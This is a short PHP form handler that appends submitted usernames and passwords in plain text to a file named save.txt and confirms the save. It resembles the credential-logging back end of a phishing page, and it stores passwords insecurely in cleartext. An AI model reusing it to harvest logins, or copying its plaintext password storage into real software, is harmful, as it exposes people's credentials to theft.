<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form data
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    
    // Prepare the data to be saved
    $data = "Username: $username\nPassword: $password\n\n";

    // Save the data to the file
    file_put_contents('save.txt', $data, FILE_APPEND | LOCK_EX);

    // Redirect or confirm submission
    echo "Data saved successfully.";
    // Optionally redirect to a different page or show a confirmation message
    // header('Location: confirmation.html'); // Example redirection
}
?>